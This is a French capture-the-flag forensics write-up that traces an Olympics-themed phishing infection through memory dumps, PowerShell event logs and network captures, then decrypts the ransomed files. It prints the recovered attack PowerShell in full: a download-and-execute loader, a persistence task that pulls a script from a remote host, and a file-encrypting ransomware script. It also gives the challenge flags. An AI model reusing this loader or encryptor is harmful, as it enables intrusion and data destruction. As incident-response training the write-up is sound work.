# Enquête sur le phishing des JO : Retracer l'attaque

* type: Forensic
* points : 500
* auteur : [Clara Chalumeau aka Clar'hacker](https://www.linkedin.com/in/clara-chalumeau/) 

---


## Partie 1/2

### Synopsis

Mike O'Soft a été averti d'une campagne de phishing par le groupe THE HAMOR. Une des personnes ayant reçu le mail de phishing en question, s'est faite piegée.

Vous avez pour mission de mener l'enquête. Heureusement pour vous, les équipes du ministère ont réalisé un dump mémoire sur la machine. Dans la suite de votre enquête, un dump réseau vous sera confié.

Sauriez-vous retracer ce qu'il s'est passé sur ce poste ?

Pour résoudre ce challenge, vous devez répondre aux questions suivantes :

1 - Quel est le nom du raccourci malveillant ?

2 - Quel est le nom de la scheduled task créé ?

3 - Quel script est lancé par cette scheduled task ?

Format du flag SHLK{'nom-fichier'-'scheduled task-'script'}

Exemple 1 - File : ctf\shutlock.test

2 - scheduled task : ScheduleTaskName

3 - script : ThisIsTheScript.sh

SHLK{shutlock.test-ScheduleTaskName-ThisIsTheScript.sh}

### First encounter

Un dump, une capture du bureau, et c'est à nous de jouer. Le système a été compromis, à nous de décrouvrir comment.

L'examen rapide de la capture d'écran donne quelques informations qui nous seront certainement utile plus tard

![capture d'écran](./1_RESOLU/Ordi.png)

Cela va tourner autour d'un PDF malveillant, et nous avons la note de rançon, avec ces informations, il est temps de commencer à creuser.

### Méthode 1 full volatility (aka quand on est pas un SoC Analyst, mais que l'on a des idées)

Une des façon de trouver le 1er flag, est de commencer par bien lire ce qui nous est demandé, nous allons donc commencer par rechercher le raccourci malveillant. On sait que sous windows, l'extension sera en .lnk, et grace au screen, on sait que ça sera lié à un PDF. 

```shell
vol -f 1_RESOLU/dump.raw windows.file | grep -iE "*\.pdf\.lnk"
```

La réponse arrive en quelques minutes:

```
0xa70451a45a80.0\Users\clara\Downloads\Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024\Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf.lnk        216
```
Nous avons notre première information. La seconde est un peu plus tricky, mais pas si compliquée à trouver.

Le poste a été chiffré, nous allons donc chercher un script powershell malveillant. Pour cela, nous allons pouvoir nous nous appuyer sur les fichiers EVTX (journaux système Windows) dans notre tâche.

Pour cela, nous allons devoir extraire le fichier qui nous intéresse, nous allons utiliser de nouveau notre ami volatiliy et une petite regex pour trouver ce dont nous avons besoin.

```shell
vol -f 1_RESOLU/dump.raw windows.file | grep -iE ".*powershell.*\.evtx"
```

Le retour arrive rapidement:

```shell
0xa704519a3db0  \Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx    216
```

Une fois la cible trouvée, nous allons devoir l'extraire de la mémoire

```shell
vol -f 1_RESOLU/dump.raw windows.dump --virtaddr 0xa704519a3db0

Volatility 3 Framework 2.7.0
Progress:  100.00               PDB scanning finished                        
Cache   FileObject      FileName        Result

DataSectionObject       0xa704519a3db0  Microsoft-Windows-PowerShell%4Operational.evtx  file.0xa704519a3db0.0xa7044ea12090.DataSectionObject.Microsoft-Windows-PowerShell%4Operational.evtx.dat
SharedCacheMap  0xa704519a3db0  Microsoft-Windows-PowerShell%4Operational.evtx  file.0xa704519a3db0.0xa7044e4f5260.SharedCacheMap.Microsoft-Windows-PowerShell%4Operational.evtx.vacb
```
L'information dont nous avons besoin se situe dans le fichier qui se termine par vacb, un petit passage par evtx_dump pour rendre le fichier lisible, et nous trouvons le script.
```json
{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "EventData": {
      "MessageNumber": 1,
      "MessageTotal": 1,
      "Path": "",
      "ScriptBlockId": "07925adc-3e1c-4463-a0cc-9d12522ebede",
      "ScriptBlockText": "$IP_addr = '172.21.195.17:5000'\r\n\r\n$urlFakeJob = \"http://$IP_addr/Holmes/Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf\"\r\n$urlTask = \"http://$IP_addr/Holmes/GetFileInfo.ps1\"\r\n$fakePlaceOffer = 'Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf'\r\n$TaskFile = 'GetFilesInfo.ps1'\r\n\r\n#Get the lure pdf\r\nInvoke-WebRequest -Uri $urlFakeJob -OutFile $fakePlaceOffer\r\n\r\n# Open the PDF file with the default PDF viewer\r\nStart-Process -FilePath $fakePlaceOffer\r\n\r\n### Schedule task\r\n$taskName = \"IGotYourFileInfo\"\r\n\r\n# Create the scheduled task that get some file information\r\n$cmd = \"Invoke-WebRequest -Uri $urlTask -OutFile $TaskFile ; Start-Process -FilePath $TaskFile\"\r\nschtasks /create /tn $taskName /sc HOURLY /tr $cmd\r\n\r\n#Encrypt some file\r\n\r\npowershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile  -c \"& {IEX ((New-Object Net.WebClient).DownloadString('http://$IP_addr/Holmes/Encrypt.ps1'))}\"\r\n\r\n## Change wallpaper\r\n$webClient = New-Object System.Net.WebClient\r\n$wallpaperUrl = \"http://$IP_addr/Holmes/wallpaper.jpg\"\r\n$wallpaperPath = \"$env:USERPROFILE\\Desktop\\wallpaper.jpg\"\r\n$webClient.DownloadFile($wallpaperUrl, $wallpaperPath)\r\n\r\n## Set the wallpaper\r\n$regKey = \"HKCU:\\Control Panel\\Desktop\"\r\nSet-ItemProperty -Path $regKey -Name Wallpaper -Value $wallpaperPath\r\n$wallpaperStyle = \"3\"\r\nSet-ItemProperty -Path $regKey -Name WallpaperStyle -Value $wallpaperStyle\r\n$tileWallpaper = \"0\"\r\nSet-ItemProperty -Path $regKey -Name TileWallpaper -Value $tileWallpaper\r\n\r\n# Forcer l'actualisation du bureau\r\nStart-Process -FilePath \"RUNDLL32.EXE\" -ArgumentList \"USER32.DLL,UpdatePerUserSystemParameters ,1 ,True\" -Wait\r\n\r\n## Create text file\r\n$fileContent = \"YOU HAVE BEEN INFECTED BY THE HAMOR FIND THE KEY TO RETREIVE YOUR FILE\"\r\nSet-Content \"$env:USERPROFILE\\Desktop\\instructions.txt\" -Value $fileContent\r\n# Open text file\r\nInvoke-Item \"$env:USERPROFILE\\Desktop\\instructions.txt\"\r\n\r\n"
    },
    "System": {
      "Channel": "Microsoft-Windows-PowerShell/Operational",
      "Computer": "DeanGilmor",
      "Correlation": {
        "#attributes": {
          "ActivityID": "3476582E-B7DF-0003-AC7D-7634DFB7DA01"
        }
      },
      "EventID": 4104,
      "EventRecordID": 133,
      "Execution": {
        "#attributes": {
          "ProcessID": 13428,
          "ThreadID": 2576
        }
      },
      "Keywords": "0x0",
      "Level": 3,
      "Opcode": 15,
      "Provider": {
        "#attributes": {
          "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
          "Name": "Microsoft-Windows-PowerShell"
        }
      },
      "Security": {
        "#attributes": {
          "UserID": "S-1-5-21-1569816960-1500504362-1823058107-1000"
        }
      },
      "Task": 2,
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2024-06-07T19:29:08.462113Z"
        }
      },
      "Version": 1
    }
  }
}
```

Le responsable est donc:

```powershell
ScriptBlockText": "$IP_addr = '172.21.195.17:5000'

$urlFakeJob = \"http://$IP_addr/Holmes/Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf\"
$urlTask = \"http://$IP_addr/Holmes/GetFileInfo.ps1\"
$fakePlaceOffer = 'Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf'
$TaskFile = 'GetFilesInfo.ps1'

#Get the lure pdf
Invoke-WebRequest -Uri $urlFakeJob -OutFile $fakePlaceOffer

# Open the PDF file with the default PDF viewer
Start-Process -FilePath $fakePlaceOffer

### Schedule task
$taskName = \"IGotYourFileInfo\"

# Create the scheduled task that get some file information
$cmd = \"Invoke-WebRequest -Uri $urlTask -OutFile $TaskFile ; Start-Process -FilePath $TaskFile\"
schtasks /create /tn $taskName /sc HOURLY /tr $cmd

#Encrypt some file

powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile  -c \"& {IEX ((New-Object Net.WebClient).DownloadString('http://$IP_addr/Holmes/Encrypt.ps1'))}\"

## Change wallpaper
$webClient = New-Object System.Net.WebClient
$wallpaperUrl = \"http://$IP_addr/Holmes/wallpaper.jpg\"
$wallpaperPath = \"$env:USERPROFILE\\Desktop\\wallpaper.jpg\"
$webClient.DownloadFile($wallpaperUrl, $wallpaperPath)

## Set the wallpaper
$regKey = \"HKCU:\\Control Panel\\Desktop\"
Set-ItemProperty -Path $regKey -Name Wallpaper -Value $wallpaperPath
$wallpaperStyle = \"3\"
Set-ItemProperty -Path $regKey -Name WallpaperStyle -Value $wallpaperStyle
$tileWallpaper = \"0\"
Set-ItemProperty -Path $regKey -Name TileWallpaper -Value $tileWallpaper

# Forcer l'actualisation du bureau
Start-Process -FilePath \"RUNDLL32.EXE\" -ArgumentList \"USER32.DLL,UpdatePerUserSystemParameters ,1 ,True\" -Wait

## Create text file
$fileContent = \"YOU HAVE BEEN INFECTED BY THE HAMOR FIND THE KEY TO RETREIVE YOUR FILE\"
Set-Content \"$env:USERPROFILE\\Desktop\\instructions.txt\" -Value $fileContent
# Open text file
Invoke-Item \"$env:USERPROFILE\\Desktop\\instructions.txt\"
```

Voilà, nous avons désormais la totalité des informations pour créer le flag

```
SHLK{Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf.lnk-IGotYourFileInfo-GetFilesInfo.ps1}
```

### Méthode 2 on industrialise un peu tout ça (aka on fait chauffer la tronçoneuse préparée hayabusa)

La méthode avec volatility est bien, mais elle est fastidieuse, on doit convertir nos evtx en json, quand on ne sais pas où chercher, cela peut prendre du temps, et s'il existait une alternative ?

Il existe deux outils pour cela, [Chainsaw](https://github.com/WithSecureLabs/chainsaw) et [Hayabusa](https://github.com/Yamato-Security/hayabusa). Ils permetent de parser les logs EVTX sans conversion préalable, et permettent d'autres actions Uber cool.

Nous allons utiliser Hayabusa et son option "search". La team a signée son méfait dans le notepad, nous allons pouvoir chercher le mot "HAMOR" dans les logs.

Cette partie se fait une fois que tout les logs ont été extrait et renommé en .evtx

![retour Hayabusa](./1_RESOLU/hayabusa.png)

## Partie 2/2

### Synopsis

Bravo !

Vous voici dans la deuxième partie de votre enquête. Le dump réseau vous a été confié avec une partie de son système de fichiers.

L'utilisatrice à qui appartiennent ces informations, est une scientifique qui travaille sur le chiffrement du système d'information des JO.

Aidez-la à déchiffrer son système de fichiers.

### trouver un tite à la con

Dans l'archive, une capture wireshark et une arborensce d'un poste windows.

Premier réflex, depuis wireshark on va commencer par exporter les objets HTTP

![export objets](./2_RESOLU/IMG/wireshark.png), ce qui va nous permettre d'extraire le script de chiffrement des fichiers

```powershell
# Define the directories to search for files
$IP_addr = '172.21.195.17:5000'
$directories = @("$env:USERPROFILE")

# Define the file extensions to encrypt
$extensions = @(".png", ".doc", ".txt", ".zip")
$keyUrl = "http://$IP_addr/Holmes/key.txt"

# Download the key from the URL
$keyContent64 = Invoke-WebRequest -Uri $keyUrl | Select-Object -ExpandProperty Content
$keyContent = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($keyContent64))

# Use SHA-256 hash function to produce a 32-byte key
$sha256 = [System.Security.Cryptography.SHA256]::Create()
$key = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($keyContent))
$iv = [System.Security.Cryptography.RijndaelManaged]::Create().IV

# Sauvegarder l'IV dans un fichier
$ivFilePath = "$env:USERPROFILE\Documents\iv"
[System.IO.File]::WriteAllBytes($ivFilePath, $iv)

# Create a new RijndaelManaged object with the specified key
$rijndael = New-Object System.Security.Cryptography.RijndaelManaged
$rijndael.Key = $key
$rijndael.IV = $iv
$rijndael.Mode = [System.Security.Cryptography.CipherMode]::CBC
$rijndael.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7


# Go through each directory
foreach ($dir in $directories) {
    # Go through each file
    Get-ChildItem -Path $dir -Recurse | ForEach-Object {
        # Check the file extension
        if ($extensions -contains $_.Extension) {
            # Generate the new file name
            $newName = $_.FullName -replace $_.Extension, ".shutlock"

            # Read the file contents in bytes
            $contentBytes = [System.IO.File]::ReadAllBytes($_.FullName)

            # Create a new encryptor
            $encryptor = $rijndael.CreateEncryptor()

            # Encrypt the content
            $encryptedBytes = $encryptor.TransformFinalBlock($contentBytes, 0, $contentBytes.Length)

            # Write the encrypted content to a file
            [System.IO.File]::WriteAllBytes($newName, $encryptedBytes)

            # Delete the original file
            Remove-Item $_.FullName
        }
    }
}
```

Joie pour nous, le script n'est pas obfusqué, nous pouvons donc commencer notre analyse.

Nous pouvons voir qu'il récupère la clef via internet, nous allons donc exporter l'objet depuis wireshark, et qu'il a stocké les IV nécessaire sur le disque de l'utilisateur.

key.txt
```
w5www63Dn8OJdGbDqlfDjsK8wqDDomg2w4I7TiBxSyfFk+KAoCZqaMOkIMKQw7tc
```

IV
```
00000000: a62c 180d 65f6 7823 c924 a7b7 7c31 a3cb  .,..e.x#.$..|1..
```

Il est au format hexdump dans le readme pour une meilleur compréhension.

Lors du CTF, j'ai fais l'erreur de me baser uniquement sur le padding et d'ignorer une information importante qui m'a fait perdre un temps de fou. Ce n'est pas de l'AES mais du Rijndael.

Une fois que l'on a compris sur quoi nous allons travailler, un petit script python pour faire le café

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import hashlib
import base64
import os


# Function to generate key from base64 encoded key content
def generate_key_from_base64(base64_key, desired_key_size):
    decoded_key = base64.b64decode(base64_key)
    sha256 = hashlib.sha256()
    sha256.update(decoded_key)
    full_key = sha256.digest()
    return full_key[:desired_key_size]


# Function to create a Rijndael cipher object
def create_cipher(key, iv):
    algorithm = algorithms.AES(key)  # AES is a subset of Rijndael
    cipher = Cipher(algorithm, modes.CBC(iv), backend=default_backend())
    return cipher


# Constants
key_file = "recovered/key.txt"  # Path to the key file
iv_file = "recovered/iv"  # Path to the IV file
encrypted_files_dir = (
    "encrypted_files"  # Directory containing encrypted .shutlock files
)
decrypted_files_dir = "decrypted_files"  # Directory to save decrypted files
block_size = 16  # Block size for Rijndael (AES uses 16 bytes blocks)

# Read key and IV
with open(key_file, "r") as f:
    base64_key = f.read().strip()

# Read IV
with open(iv_file, "rb") as f:
    iv = f.read()

# Desired key sizes in bytes (128 bits, 192 bits, 256 bits)
desired_key_sizes = [16, 24, 32]

# Decrypt each .shutlock file in the directory
for filename in os.listdir(encrypted_files_dir):
    if filename.endswith(".shutlock"):
        encrypted_filepath = os.path.join(encrypted_files_dir, filename)
        decrypted_filepath = os.path.join(
            decrypted_files_dir, filename[:-8]
        )  # Remove .shutlock extension

        with open(encrypted_filepath, "rb") as f:
            encrypted_data = f.read()

        # Try different key sizes
        decrypted = False
        for key_size in desired_key_sizes:
            try:
                key = generate_key_from_base64(base64_key, key_size)
                cipher = create_cipher(key, iv)
                decryptor = cipher.decryptor()
                decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

                # Unpad the decrypted data
                unpadder = padding.PKCS7(block_size * 8).unpadder()
                decrypted_data = unpadder.update(decrypted_data) + unpadder.finalize()

                # Write the decrypted data to file
                with open(decrypted_filepath, "wb") as f:
                    f.write(decrypted_data)

                print(f"Decrypted {filename} using key size {key_size * 8} bits")
                decrypted = True
                break
            except Exception as e:
                print(
                    f"Error decrypting {filename} with key size {key_size * 8} bits: {e}"
                )

        if not decrypted:
            print(f"Failed to decrypt {filename} with any key size")

print("Decryption complete.")
```

Il nous reste plus qu'à mettre les fichiers en .shutlock dans le repertoire encrypted_files et executer le script

![mais comment j'ai été heureux de voir ce canard](./2_RESOLU/decrypted_files/duck.png)

Désormais, nous que nous avons récupéré les documents chiffrés de l'utilisatrice, nous allons pouvoir extraire les données … OU PAS ! L'archive est chiffrée ! 

### À la recherche du mot de passe perdu

Il est temps de mettre notre plus joli chapeau, de prendre notre fouet de d'aller faire de l'archéologie dans ce que nous avons pour trouver ce mot de passe.

Mes premières assomptions sont :

* dans la mémoire du presse-papier
* dans un fichier kdbx (si vault keepass)
* dans un fichier excel/texte/n'importe où un utilisateur pourrait le stocker

Pour la mémoire, avec volatility3 nous avons perdu la capacité de faire comme avec volatility2, il faudra chercher autrement. Pour commencer, on peut chercher dans windows.cmdline. Mais on ne trouvera rien. 

On peux aussi chercher  dans les fichiers présent comme nous avons fait pour les kdbx, et checher des extensions "classique" comme *kdbx,xlsx,docx* … Mais encore une fois, c'est raté.

Après plus de 48h de blocages et d'idée plus où moins bonnes, la solution c'est présentée à moi en cherchant une base de donnée pour retrouver le presse-papier.

Dans les fichiers que nous avons, il y a un répertoire avec les stickynotes, pour ceux qui ne connaissent pas, c'est la version numérique des bons vieux post-it, et pour l'avoir vécu en vrai dans une entreprise, les mots de passes sont souvent stocké dedans, et une chance pour nous, c'est au format sqlite.

Notre cible se trouve ici
```FileSystem/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe```

C'est parti pour la recherche

```shell
sqlite3 FileSystem/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite '.tables' 
Insight         Note            StrokeMetadata  Tag             User          
Media           Stroke          SyncState       UpgradedNote  
```

On trouve "Note" dans la liste des tables, nous allons y faire un tour pour vérifier ce qu'il y a dedans:

```shell
sqlite3 FileSystem/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite 'select * from Note;'

\id=1f0391ce-61cd-4649-af89-3814161c7556 pwd importante recherche: s3cr3t_r3ch3rch3_pwd_!|ManagedPosition=|0|0||Yellow|0||||||0||d258c4ba-5e6a-46f7-a389-b5b44588db04|b313c38c-0b02-4c64-b989-5e7734d8454e|638532167531094865||638545650009984169
```

Super, nous avons le mot de passe de l'archive, nous pouvons désormais extraire les fichiers.

```s3cr3t_r3ch3rch3_pwd_!```

Une fois archiver, nous arrivons sur deux fichiers, un doc et un jpg. Dans le doc, rien de très utile dans le texte, nous allons analyser le jpg à la recherche de stego

```shell
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "flag.txt".
[i] Extracting to "chiffrement.jpeg.out".

```

Tiens, il a trouvé un fichier flag.txt, il l'a ressorti en chiffrement.jpeg.out, c'est parti pour regarder ce qu'il contient.

```
SHLK{4uri3z-v0us_cl1qu3r}
```
